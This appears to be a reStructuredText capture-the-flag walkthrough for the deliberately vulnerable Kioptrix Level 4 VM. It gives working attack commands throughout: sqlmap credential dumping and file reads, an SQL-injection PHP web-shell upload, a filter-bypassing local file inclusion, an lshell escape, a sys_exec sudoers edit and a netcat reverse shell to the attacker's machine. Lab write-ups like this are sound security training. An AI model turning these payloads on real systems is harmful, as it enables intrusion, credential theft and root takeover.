@@ -1,0 +1,661 @@
+.. include:: /pentest_links.txt
+
+.. _Kioptrix4:
+
+****************
+Kioptrix Level 4
+****************
+
+Setup
+=====
+
+Setting up the VMware VM
+------------------------
+
+The challenge is `Kioptrix: Level 1.3 (#4) <https://www.vulnhub.com/entry/kioptrix-level-13-4,25/>`_, the fourth of the `Vulnhub Kioptrix Series <https://www.vulnhub.com/series/kioptrix,8/>`_. The VM comes packaged as `Kioptrix4_vmware.rar <http://www.kioptrix.com/dlvm/Kioptrix4_vmware.rar>`_, which is a rar archive containing a VMware vmdk file. If you have any setup troubles you can add the disk to an existing Linux VM, mount it, make a copy of :file:`/etc/shadow`, and delete the root password hash. This will provide passwordless root access to fix any issues. See :ref:`VMSetup` for background on using the VMware vmdk file. Kioptrix4 runs Ubuntu 8.04.3 LTS i686.
+
+Setting up your environment
+---------------------------
+
+If you want to easily cut-and-paste from the sample code below, download and edit :download:`kioptrix4_setup.sh`: 
+
+.. code-block:: bash
+
+    PT=$HOME/pentest/kioptrix4
+    mkdir -p $PT
+    cd $PT
+    # download kioptrix4_setup.sh
+    curl --silent --remote-name https://pentest-meetup.appspot.com/html/_downloads/kioptrix4_setup.sh
+    # edit as needed; later the recon will give you TARGET IP
+    source kioptrix4_setup.sh
+
+``kioptrix4_setup.sh`` should look something like:
+
+.. code-block:: bash
+
+  #!/usr/bin/env bash
+
+  # *******************************************************
+  # Edit these to match your setup
+  # *******************************************************
+  TARGET=192.168.1.167          # ip of kioptrix4
+  SUBNET=192.168.1.0/24         # subnet
+  KALI=192.168.1.104            # Kali IP
+  PORT=443                      # reverse shell port
+  PT=$HOME/pentest/kioptrix4    # create working directories here
+
+  [[ $(grep -c kioptrix4 /etc/hosts) -eq 0 ]] && \
+    echo " add \"$TARGET kioptrix4.com\" to /etc/hosts"
+
+  # *******************************************************
+  # Maybe edit these
+  # *******************************************************
+  # Create some directories
+  TOOLS=exploit,nmap,spider,sqlmap
+  eval mkdir -p $PT/{$TOOLS}
+  TARGETS=targets.txt
+
+  # *******************************************************
+  # Don't edit these
+  # *******************************************************
+  HOST=kioptrix4.com
+  SUDO=$(which sudo)
+  [[ "$USER" == "root" ]] && SUDO=
+
+
+Reconnaisance
+=============
+
+Network reconnaissance
+----------------------
+
+Start with some standard network reconnaissance looking for the vulnerable host:
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/kioptrix4
+  source $PT/kioptrix4_setup.sh
+  cd $PT/nmap
+  $SUDO nmap -sn -PE -oA nmap_sn $SUBNET
+  $SUDO chown $USER.$USER nmap_sn.*
+  # use the grep-able output to get a list of target hosts
+  grep Up nmap_sn.gnmap | cut -d" " -f2 > $TARGETS
+  # use the xml output to get an html report
+  xsltproc nmap_sn.xml -o nmap_sn.html
+
+The above reconnaissance should identify the IP for $TARGET and can update $PT/kioptrix4_setup.sh with this value and edit :file:`/etc/hosts` to add "kioptrix4.com" (``echo "$TARGET kioptrix4.com" | $SUDO tee -a /etc/hosts``). Then we can enumerate the open ports and services:
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/kioptrix4
+  source $PT/kioptrix4_setup.sh
+  $SUDO nmap -A -vv -T3 --max-retries 5 -Pn -oA nmap_A $TARGET
+  $SUDO chown $USER.$USER nmap_A.*
+  xsltproc nmap_A.xml -o nmap_A.html
+
+Running this reveals:
+
+* port 22: OpenSSH OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+
+* port 80: Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+
+  A quick search for PHP/5.2.4-2ubuntu5.6 indicates the target is Ubuntu Hardy (8.04).
+
+* ports 139, 445: Unix (Samba 3.0.28a)
+
+SMB reconnaissance via nmap script
+----------------------------------
+
+We utilize :file:`/usr/share/nmap/scripts/smb-enum-users.nse` to see if we can find some user accounts:
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/kioptrix4
+  source $PT/kioptrix4_setup.sh
+  cd $PT/nmap
+  nmap  -oA nmap_smb --script smb-enum-users $TARGET -p 139,445
+
+That gives us these user accounts:
+
+.. code-block:: console
+
+  |   KIOPTRIX4\john (RID: 3002)
+  |   KIOPTRIX4\loneferret (RID: 3000)
+  |   KIOPTRIX4\nobody (RID: 501)
+  |   KIOPTRIX4\robert (RID: 3004)
+  |   KIOPTRIX4\root (RID: 1000)
+
+Port 80 reconnaissance via dirb & nikto
+---------------------------------------
+
+Out of habit we do :program:`dirb` and :program:`nikto` scans. Of note :program:`dirb` found directory :file:`/john`.
+
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/kioptrix4
+  source $PT/kioptrix4_setup.sh
+  cd $PT/spider
+  dirb  http://$HOST/ -o dirb.txt
+  nikto -output nikto.html -C all -host $HOST -port 80
+
+Actually visiting the web site shows a login page at http://kioptrix4.com, so we'll try to bust it with :program:`sqlmap`.
+
+:program:`sqlmap` on login form
+-------------------------------
+
+Run this :program:`sqlmap`:
+
+.. code-block:: bash
+  :emphasize-lines: 4-
+
+  PT=$HOME/pentest/kioptrix4
+  source $PT/kioptrix4_setup.sh
+  cd $PT/sqlmap
+  URL='http://kioptrix4.com/'
+  sqlmap -u "$URL" --batch --random-agent --output-dir $PWD/sqlmap \
+    --banner --current-user --is-dba --current-db --users --passwords \
+    --forms --dbs
+
+:program:`sqlmap` shows:
+
+.. code-block:: console
+  :emphasize-lines: 3-4,18-
+
+  back-end DBMS: MySQL 5.0.11
+  banner:    '5.0.51a-3ubuntu5.4'
+  current user:    'root@localhost'
+  current user is DBA:    True
+  current database:    'members'
+  database management system users [6]:
+  [*] ''@'Kioptrix4'
+  [*] ''@'localhost'
+  [*] 'debian-sys-maint'@'localhost'
+  [*] 'root'@'127.0.0.1'
+  [*] 'root'@'Kioptrix4'
+  [*] 'root'@'localhost'
+  database management system users password hashes:
+  [*]  [1]:
+      password hash: NULL
+  [*] debian-sys-maint [1]:
+      password hash: *3AC38ADE5482EA4DE628D0D43BF8FA41E3CF3879
+  [*] root [1]:
+      password hash: NULL
+  available databases [3]:
+  [*] information_schema
+  [*] members
+  [*] mysql
+
+Did you see that? The mysql current user is the mysql root user and is passwordless? Before we follow up on that let's dump the members table:
+
+.. code-block:: bash
+  :emphasize-lines: 4-
+
+  PT=$HOME/pentest/kioptrix4
+  source $PT/kioptrix4_setup.sh
+  cd $PT/sqlmap
+  URL='http://kioptrix4.com/'
+  sqlmap -u "$URL" --batch --random-agent --output-dir $PWD/sqlmap \
+    --dbms="MySQL" --forms -D members --dump
+
+This reveals 2 users:
+
+.. code-block:: console
+  :emphasize-lines: 7-8
+
+  Database: members
+  Table: members
+  [2 entries]
+  +----+----------+-----------------------+
+  | id | username | password              |
+  +----+----------+-----------------------+
+  | 1  | john     | MyNameIsJohn          |
+  | 2  | robert   | ADGAdsafdfwt4gadfga== |
+  +----+----------+-----------------------+
+
+It turns out these 2 user's mysql password is the same as their kioptrix4 password, giving us SSH access to kioptrix4.
+
+:program:`sqlmap` extras
+------------------------
+
+This is very unusual to have a passwordless mysql root so let's try some :program:`sqlmap` commands we haven't used before.
+
+--file-read
+^^^^^^^^^^^
+
+First let's use "--file-read" to get at kioptrix4 system files:
+
+.. code-block:: bash
+  :emphasize-lines: 4-
+
+  PT=$HOME/pentest/kioptrix4
+  source $PT/kioptrix4_setup.sh
+  cd $PT/sqlmap
+  FILE='/etc/passwd'
+  URL='http://kioptrix4.com/'
+  sqlmap -u "$URL" --batch --random-agent --output-dir $PWD/sqlmap \
+    --dbms="MySQL" --forms --file-read="$FILE" -v 0
+
+Running this gets us :file:`/etc/passwd`:
+
+.. code-block:: console
+  :emphasize-lines: 1-3,8-9,11,13,15-
+
+  hacker@kali:~/pentest/kioptrix4/sqlmap$ FILE='/etc/passwd'
+  hacker@kali:~/pentest/kioptrix4/sqlmap$ sqlmap -u "$URL" --batch --random-agent --output-dir $PWD/sqlmap 
+      --dbms="MySQL" --forms --file-read="$FILE" -v 0
+  ###################### SNIP ######################
+  files saved to [1]:
+  [*] /home/hacker/pentest/kioptrix4/sqlmap/sqlmap/kioptrix4.com/files/_etc_passwd (same file)
+  ###################### SNIP ######################
+  hacker@kali:~/pentest/kioptrix4/sqlmap$ cat /home/hacker/pentest/kioptrix4/sqlmap/sqlmap/kioptrix4.com/files/_etc_passwd
+  root:x:0:0:root:/root:/bin/bash
+  ###################### SNIP ######################
+  www-data:x:33:33:www-data:/var/www:/bin/sh
+  ###################### SNIP ######################
+  mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false
+  ###################### SNIP ######################
+  loneferret:x:1000:1000:loneferret,,,:/home/loneferret:/bin/bash
+  john:x:1001:1001:,,,:/home/john:/bin/kshell
+  robert:x:1002:1002:,,,:/home/robert:/bin/kshell
+
+--file-write & --file-dest failure
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Next let's use "--file-write LOCALFILE" and "--file-dest REMOTEFILE" to transfer LOCALFILE to REMOTEFILE. Although g0tm1lk's `Kioptrix - Level 4 (SQL Injection) <https://blog.g0tmi1k.com/2012/02/kioptrix-level-4-sql-injection/>`_ reported success with this, our sqlmap complained "none of the SQL injection techniques detected can be used to write files to the underlying file system of the back-end MySQL server".
+
+.. code-block:: bash
+  :emphasize-lines: 4-
+
+  PT=$HOME/pentest/kioptrix4
+  source $PT/kioptrix4_setup.sh
+  cd $PT/sqlmap
+  
+  REMOTEFILE="/var/www/x.php"
+  LOCALFILE="$PWD/x.php"
+  CMD='<?php passthru($_GET["cmd"]); ?>'
+  echo "$CMD" > $LOCALFILE
+  chmod +x $LOCALFILE
+  URL='http://kioptrix4.com/'
+  sqlmap -u "$URL" --batch --random-agent --output-dir $PWD/sqlmap \
+    --dbms="MySQL" --forms --file-write="$LOCALFILE" --file-dest="$REMOTEFILE" -v 0
+  curl --silent $URL/x.php?cmd=id
+
+The sqlmap error reported was:
+
+.. code-block:: console
+
+  [15:38:27] [ERROR] none of the SQL injection techniques detected can be used to write files to the underlying file system of the back-end MySQL server
+
+
+
+--sql-shell
+^^^^^^^^^^^
+
+Next let's get a mysql shell going:
+
+.. code-block:: bash
+  :emphasize-lines: 4-
+
+  PT=$HOME/pentest/kioptrix4
+  source $PT/kioptrix4_setup.sh
+  cd $PT/sqlmap
+  URL='http://kioptrix4.com/'
+  sqlmap -u "$URL" --batch --random-agent --output-dir $PWD/sqlmap \
+    --dbms="MySQL" --forms --sql-shell -v 0
+
+Running this gets us a mysql shell missing some output, but still useful:
+
+.. code-block:: console
+  :emphasize-lines: 1-2,4,6-8,14-16,18-
+
+  hacker@kali:~/pentest/kioptrix4/sqlmap$ sqlmap -u "$URL" --batch --random-agent --output-dir $PWD/sqlmap \
+    --dbms="MySQL" --forms --sql-shell -v 0
+  ###################### SNIP ######################
+  sql-shell> show databases;
+  [10:29:12] [WARNING] time-based comparison requires larger statistical model, please wait......................
+  sql-shell> -- ugh - no output
+  sql-shell> -- see if we can execute OS commands using sys_exec
+  sql-shell> select * from mysql.func;
+  the SQL query provided can return 2 entries. How many entries do you want to retrieve?
+  [a] All (default)
+  [#] Specific number
+  [q] Quit
+  > a
+  select * from mysql.func; [2]:
+  [*] lib_mysqludf_sys.so, lib_mysqludf_sys_info, 0, function
+  [*] lib_mysqludf_sys.so, sys_exec, 0, function
+
+  sql-shell> -- so can execute system commands as user mysql runs under
+  sql-shell> select sys_exec("id");
+  select sys_exec("id");:    ' '
+  sql-shell> -- a "blind" capability
+  sql-shell> -- turns out we're doing this as root but don't know it :)
+  sql-shell> exit
+
+So we can get a mysql shell but much of the output is missing. The mysql database has `mysqludf/lib_mysqludf_sys <https://github.com/mysqludf/lib_mysqludf_sys>`_  installed. It provides access to OS-level commands using the id mysql is using, which if it's root leads to `MySQL Root to System Root with lib_mysqludf_sys for Windows and Linux <http://www.iodigitalsec.com/mysql-root-to-system-root-with-udf-for-windows-and-linux/>`_. To tell the mysql userid we'd have to create a file and see what perms it has. It turns out mysql is running as root, but we'll not follow this path right now.
+
+--sql-query
+-----------
+
+And you can run 1 query via:
+
+.. code-block:: bash
+  :emphasize-lines: 4-
+
+  PT=$HOME/pentest/kioptrix4
+  source $PT/kioptrix4_setup.sh
+  cd $PT/sqlmap
+  URL='http://kioptrix4.com/'
+  sqlmap -u "$URL" --batch --random-agent --output-dir $PWD/sqlmap \
+    --dbms="MySQL" --forms --sql-query='select * from members;' -v 0
+
+File download and upload
+------------------------
+
+Downloading files
+^^^^^^^^^^^^^^^^^
+
+Via the web server
+""""""""""""""""""
+
+The html has a local file inclusion problem in the url http://kioptrix4.com/member.php?username=john (used to display a member's control panel). When you try to download :file:`/etc/password` by changing "john" to "../../../../../../etc/passwd", the "etc" is filtered out. Two standard tricks to get around this are duplicating the string ("etc" becomes "etcetc") or embedding the string within itself ("etc" becomes "eetctc" so removing the inner "etc" leaves "etc"). Here's an example:
+
+.. code-block:: console
+  :emphasize-lines: 4-
+
+  PT=$HOME/pentest/kioptrix4
+  source $PT/kioptrix4_setup.sh
+  cd $PT/exploit
+  # does not work - etc filtered out
+  FILE='../../../../../../etc/passwd'
+  URL="http://kioptrix4.com/member.php?username=$FILE%00"
+  curl --silent "$URL"
+  # works - etcetc
+  FILE='../../../../../../etcetc/passwd'
+  URL="http://kioptrix4.com/member.php?username=$FILE%00"
+  curl --silent "$URL"
+  # works - eetctc
+  FILE='../../../../../../eetctc/passwd'
+  URL="http://kioptrix4.com/member.php?username=$FILE%00"
+  curl --silent "$URL"
+
+Via mysql
+"""""""""
+
+The mysql database can both read and write files on the target host. Unfortunately there are some security-motivated restrictions. From `13.2.6 LOAD DATA INFILE Syntax <https://dev.mysql.com/doc/refman/5.7/en/load-data.html>`_:
+
+  For security reasons, when reading text files located on the server, the files must either reside in the database directory or be readable by the user account used to run the server.
+
+So when the database is accessed by the web server, even if the mysql process runs as root, files outside the database directory are restricted to those the web server could access itself.
+
+Uploading files using sql injection
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+The mysql database can both read and write files on the target host. Unfortunately there are some security-motivated restrictions. From `13.2.9.1 SELECT ... INTO Syntax <http://dev.mysql.com/doc/refman/5.7/en/select-into.html>`_:
+
+  The SELECT ... INTO OUTFILE 'file_name' form of SELECT writes the selected rows to a file. The file is created on the server host, so you must have the FILE privilege to use this syntax. file_name cannot be an existing file, which among other things prevents files such as /etc/passwd and database tables from being destroyed.
+
+So the database cannot overwrite or append to existing files, but can create new files. g0tm1lk's `Kioptrix - Level 4 (SQL Injection) <https://blog.g0tmi1k.com/2012/02/kioptrix-level-4-sql-injection/>`_ writeup has 2 nice examples of using SQL injection to upload files. We translate the first here to use :program:`curl`: it uploads the php script ``<?php passthru($_GET['cmd']); ?>``. The SQL injection's UNION must have the same number of columns as the hijacked query: 3 in this case. It starts the output file with 3 blanks (0x20) and then includes the PHP script as a hex-encoded line terminator (``LINES TERMINATED BY``). Again, if the file exists it will not be overwritten.
+
+.. code-block:: bash
+
+  # this is the PHP script to upload - encode it as ascii hex with a leading "0x"
+  CMD='<?php passthru($_GET["cmd"]); ?>'
+  HEXCMD=$(python3 -c "print(''.join(list(map(lambda x: x[-2:],map(hex,map(ord,'$CMD'))))))")
+  HEXCMD="0x$HEXCMD"
+
+  # UNION must have 3 columns to match members table, so uses 3 blanks
+  #   PHP script is output as a line terminator (LINES TERMINATED BY)
+  URL='http://kioptrix4.com/checklogin.php'
+  INJECT="' AND 1=1 UNION SELECT 0x20,0x20,0x20 INTO OUTFILE '/var/www/backdoor.php' LINES TERMINATED BY $HEXCMD -- "
+  curl -v -L $URL \
+    --data-urlencode myusername="admin" \
+    --data-urlencode mypassword="$INJECT" \
+    --data-urlencode Submit="Login"
+
+  # now test out backdoor.php with "id"
+  curl --silent http://kioptrix4.com/backdoor.php?cmd=id
+
+The other example (left to the reader) is to upload a cron job that uses ``nc`` to connect back to the attacker.
+
+
+The Exploits
+============
+
+Exploit: SSH and root mysql
+---------------------------
+
+This is a more typical or traditional exploit: start with SSH to kioptrix4; break out of the limited shell; use mysql running as root to escalate a user to root via :file:`/etc/sudoers` or "admin" group. Start with SSH using john/MyNameIsJohn:
+
+.. code-block:: console
+  :emphasize-lines: 4,6-12,15
+
+  hacker@kali:~/pentest/kioptrix4/sqlmap$ PT=$HOME/pentest/kioptrix4
+  hacker@kali:~/pentest/kioptrix4/sqlmap$ source $PT/kioptrix4_setup.sh
+  hacker@kali:~/pentest/kioptrix4/sqlmap$ cd $PT/exploit
+  hacker@kali:~/pentest/kioptrix4/exploit$ ssh john@kioptrix4.com
+  john@kioptrix4.com's password: 
+  Welcome to LigGoat Security Systems - We are Watching
+  == Welcome LigGoat Employee ==
+  LigGoat Shell is in place so you  don't screw up
+  Type '?' or 'help' to get the list of allowed commands
+  john:~$ ?
+  cd  clear  echo  exit  help  ll  lpath  ls
+  john:~$ sudo
+  Traceback (most recent call last):
+    File "/bin/kshell", line 27, in <module>
+      lshell.main()
+    File "/usr/lib/python2.5/site-packages/lshell.py", line 1219, in main
+      cli.cmdloop()
+    File "/usr/lib/python2.5/site-packages/lshell.py", line 410, in cmdloop
+      stop = self.onecmd(line)
+    File "/usr/lib/python2.5/site-packages/lshell.py", line 531, in onecmd
+      func = getattr(self, 'do_' + cmd)
+    File "/usr/lib/python2.5/site-packages/lshell.py", line 132, in __getattr__
+      if self.check_secure(self.g_line, self.conf['strict']) == 1: 
+    File "/usr/lib/python2.5/site-packages/lshell.py", line 247, in check_secure
+      if cmdargs[1] not in self.conf['sudo_commands'] and cmdargs:
+  TypeError: 'NoneType' object is unsubscriptable
+  Connection to kioptrix4.com closed.
+
+This appears to be `ghantoos/lshell <https://github.com/ghantoos/lshell>`_. Doing a quick search for "lshell exploit" shows an easy workaround: ``echo os.system('/bin/bash')``:
+
+.. code-block:: console
+  :emphasize-lines: 1,7-
+
+  hacker@kali:~/pentest/kioptrix4/exploit$ ssh john@kioptrix4.com
+  john@kioptrix4.com's password: 
+  Welcome to LigGoat Security Systems - We are Watching
+  == Welcome LigGoat Employee ==
+  LigGoat Shell is in place so you  don't screw up
+  Type '?' or 'help' to get the list of allowed commands
+  john:~$ echo os.system('/bin/bash')
+  john@Kioptrix4:~$ id
+  uid=1001(john) gid=1001(john) groups=1001(john)
+  john@Kioptrix4:~$ export TERM=linux
+
+Next we use `rebootuser/LinEnum <https://github.com/rebootuser/LinEnum>`_ to do some reconnaissance:
+
+.. code-block:: bash
+
+  wget --quiet --no-check-certificate \
+    https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+  chmod +x LinEnum.sh; ./LinEnum.sh -t 2>&1 | tee LinEnum.out
+
+Scanning through LinEnum.out we see mysql (5.0.51a) runs as root without a password. A quick search on running mysql as root turns up `MySQL Root to System Root with lib_mysqludf_sys for Windows and Linux <http://www.iodigitalsec.com/mysql-root-to-system-root-with-udf-for-windows-and-linux/>`_. This exploit depends upon `mysqludf/lib_mysqludf_sys <https://github.com/mysqludf/lib_mysqludf_sys>`_; it turns out the required :file:`/usr/lib/lib_mysqludf_sys.so` is already on the system and defines the required ``sys_exec()`` function, so we can run the exploit without setup:
+
+.. code-block:: console
+  :emphasize-lines: 1-2,3,5,6,8,12-
+
+  john@Kioptrix4:~$ ls -l /usr/lib/lib_mysqludf_sys.so
+  -rw-rw-rw- 1 root root 12896 2012-02-04 10:08 /usr/lib/lib_mysqludf_sys.so
+  john@Kioptrix4:~$ CMD='select * from mysql.func;'
+  john@Kioptrix4:~$ mysql -u root -e "$CMD" mysql
+  +-----------------------+-----+---------------------+----------+
+  | name                  | ret | dl                  | type     |
+  +-----------------------+-----+---------------------+----------+
+  | lib_mysqludf_sys_info |   0 | lib_mysqludf_sys.so | function | 
+  | sys_exec              |   0 | lib_mysqludf_sys.so | function | 
+  +-----------------------+-----+---------------------+----------+
+  john@Kioptrix4:~$ CMD='select sys_exec('"'"'echo "john ALL=NOPASSWD: ALL" >> /etc/sudoers'"'"');'
+  john@Kioptrix4:~$ echo $CMD
+  select sys_exec('echo "john ALL=NOPASSWD: ALL" >> /etc/sudoers');
+  john@Kioptrix4:~$ mysql -u root -e "$CMD" mysql
+  +-----------------------------------------------------------+
+  | sys_exec('echo "john ALL=NOPASSWD: ALL" >> /etc/sudoers') |
+  +-----------------------------------------------------------+
+  | NULL                                                      | 
+  +-----------------------------------------------------------+
+  john@Kioptrix4:~$ sudo su -
+  root@Kioptrix4:~# id
+  uid=0(root) gid=0(root) groups=0(root)
+
+And we are root. Alternatively we could have added john to the admin group by changing our command to ``select sys_exec('usermod -a -G admin john');``.
+
+
+Exploit: :file:`/proc/self/fd/9` and root mysql
+-----------------------------------------------
+
+This is an unusual exploit based on `Kioptrix - Level 4 (Local File Inclusion) <https://blog.g0tmi1k.com/2012/02/kioptrix-level-4-local-file/>`_: use local file inclusion on :file:`/proc/self/fd/9` to execute shell commands to get a reverse shell using mysql running as root.
+
+:file:`/proc/self/fd/9` is :file:`/var/lib/php_$PHPSESSID`
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+:file:`/proc/self/fd/9` background
+""""""""""""""""""""""""""""""""""
+
+For general information on :file:`/proc` see:
+
+* `Linux Filesystem Hierarchy 1.14. /proc <http://www.tldp.org/LDP/Linux-Filesystem-Hierarchy/html/proc.html>`_
+
+* `Linux Programmer's Manual PROC(5) <http://man7.org/linux/man-pages/man5/proc.5.html>`_
+
+* `Advanced Linux Programming Ch 7 The /proc File System <http://www.advancedlinuxprogramming.com/alp-folder/alp-ch07-proc-filesystem.pdf>`_
+
+Which :file:`/proc/self/fd/?` is in use?
+""""""""""""""""""""""""""""""""""""""""
+
+The actual file descriptor integer number in use will vary. For this particular case you start searching from 0 until you don't get an error:
+
+.. code-block:: bash
+  :emphasize-lines: 4-
+
+  PT=$HOME/pentest/kioptrix4
+  source $PT/kioptrix4_setup.sh
+  cd $PT/exploit
+  # find FD in use (probably 9 but try starting at 0)
+  FD=no
+  for i in {0..10..1}; do
+    FILE='../../../../../../proc/self/fd/'"$i"
+    URL="http://kioptrix4.com/member.php?username=$FILE%00"
+    WARNING="$(curl --silent "$URL" 2>&1 | grep -c Warning)"
+    [[ "$WARNING" == "0" ]] && { FD=$i; break; }
+  done
+  [[ "$FD" == "no" ]] && { echo "ERROR: FAILED TO FIND FD"; exit; }
+  echo "FD=$FD"
+
+In our case it's 9.
+
+What does :file:`/proc/self/fd/$FD` reference?
+""""""""""""""""""""""""""""""""""""""""""""""
+
+It references :file:`/var/lib/php5/sess_$PHPSESSID`. That is, for cookie PHPSESSID=e67efa732b9b15b6def9824e1200db76, :file:`/proc/self/fd/$FD` references file :file:`/var/lib/php5/sess_e67efa732b9b15b6def9824e1200db76` and ``cat /var/lib/php5/sess_e67efa732b9b15b6def9824e1200db76`` gives the same output as :file:`/proc/self/fd/N`:
+
+.. code-block:: console
+  :emphasize-lines: 2-3,6,8-
+
+  # on kioptrix4 - cat of /var/lib/php5/sess_e67efa732b9b15b6def9824e1200db76
+  john@Kioptrix4:/var/lib/php5$ sudo cat sess_e67efa732b9b15b6def9824e1200db76
+  myusername|s:4:"user";mypassword|s:12:"' OR 1=1-- -";
+
+  # on kali - fetch /proc/self/fd/9 using the matching cookie
+  hacker@kali:~/pentest/kioptrix4/exploit$ cat $COOKIES
+  ###################### SNIP ######################
+  kioptrix4.com	FALSE	/	FALSE	0	PHPSESSID	e67efa732b9b15b6def9824e1200db76
+  hacker@kali:~/pentest/kioptrix4/exploit$ curl --silent --cookie $COOKIES -L $URL
+  myusername|s:4:"user";mypassword|s:12:"' OR 1=1-- -";
+
+So cookies are very important in the sense that they change :file:`/proc/self/fd/$FD`.
+
+What's in :file:`/proc/self/fd/$FD`?
+""""""""""""""""""""""""""""""""""""
+
+Here is a peek at the session file for running shell commands in php:
+
+.. code-block:: console
+
+  john@Kioptrix4:/var/lib/php5$ sudo cat sess_9c41e85731871e88a3a2ba265cf5c6bb
+  myusername|s:4:"user";mypassword|s:58:"' OR 1=1-- - <?php echo "\n\n"; passthru($_GET['cmd']); ?>";
+
+It contains the form input fields: here "myusername" and "mypassword" field names followed by "|"; then a colon-separated triple of the data type "s" for string; field length of 4 and 58, respectively; and the actual value. When mypassword is included in a mysql query the ``OR 1=1`` causes the login to succeed and the ``--`` comments out the rest (the php part). When we use a local file inclusion of session file, the trailing ``<?php ... ?>`` is executed as php code, running our command. That's how this exploit works.
+
+
+Logging in and running shell commands via :file:`/proc/self/fd/$FD`
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Local file inclusion provides limited reconnaissance; what's really needed is to run some remote shell commands. We do this by including ``<?php echo "\\n\\n"; passthru(\$_GET['cmd']); ?>`` at the end of :file:`/proc/self/fd/$FD`. Its contents consist of a string having 2 parts: the mysql injection with a trailing "-- -" which makes mysql ignore the rest of the string, followed by the php script. Once we set this up we can run commands on kioptrix4. Here's an example of some simple commands:
+
+.. code-block:: bash
+
+  # assumes $FD computed as above
+  PT=$HOME/pentest/kioptrix4
+  source $PT/kioptrix4_setup.sh
+  cd $PT/exploit
+
+  # COOKIES_CMD for the php passthru command executor
+  COOKIES_CMD=cookies_CMD.txt
+  rm -f $COOKIES_CMD
+  URL='http://kioptrix4.com/checklogin.php'
+  INJECT="' OR 1=1-- - <?php echo "'"\n\n"'"; passthru(\$_GET['cmd']); ?>"
+  curl --silent -L --cookie-jar $COOKIES_CMD $URL \
+    --data-urlencode myusername="user" \
+    --data-urlencode mypassword="$INJECT" \
+    --data-urlencode Submit="Login"
+
+  # run "id", "which netcat", then fire up a reverse shell
+  URL="http://kioptrix4.com/member.php"
+  CMD="id"
+  curl --silent --get --cookie $COOKIES_CMD "$URL" \
+    --data username="/proc/self/fd/$FD%00" \
+    --data-urlencode cmd="$CMD" 2>&1
+  CMD="which netcat"
+  curl --silent --get --cookie $COOKIES_CMD "$URL" \
+    --data username="/proc/self/fd/$FD%00" \
+    --data-urlencode cmd="$CMD" 2>&1
+
+Getting root
+^^^^^^^^^^^^
+
+Now at this point we can carry out reconnaissance just like the other exploits. We could even do a reverse bash shell via ``CMD="/bin/netcat $KALI $PORT -e /bin/bash"``. We could reproduce finding out that mysql is running as root and the /usr/lib/lib_mysqludf_sys.so sys_exec UDF is already installed providing ``sys_exec()``. After all that work we can simply set up a listener on the Kali side prior to firing off a root shell via mysql. Here's the Kali listener (run from a different terminal window):
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/kioptrix4
+  source $PT/kioptrix4_setup.sh
+  cd $PT/exploit
+  $SUDO socat - TCP-LISTEN:$PORT
+
+Back in the original terminal window, use :program:`curl` to open up a reverse shell:
+
+.. code-block:: bash
+
+  CMD2="/bin/netcat $KALI $PORT -e /bin/bash"
+  CMD="mysql -u root -e \"select sys_exec(\\\"$CMD2\\\")\" mysql"
+  curl --silent --get --cookie $COOKIES_CMD "$URL" \
+    --data username="/proc/self/fd/$FD%00" \
+    --data-urlencode cmd="$CMD" 2>&1
+
+A root reverse shell opens in the Kali listener terminal window:
+
+.. code-block:: console
+
+  hacker@triple:~/pentest/kioptrix4/exploit$ $SUDO socat - TCP-LISTEN:$PORT
+  id
+  uid=0(root) gid=0(root)
+  export TERM=linux
+  python -c 'import pty; pty.spawn("/bin/bash")'
+  root@Kioptrix4:/var/lib/mysql# 
+
+And we have root.
+
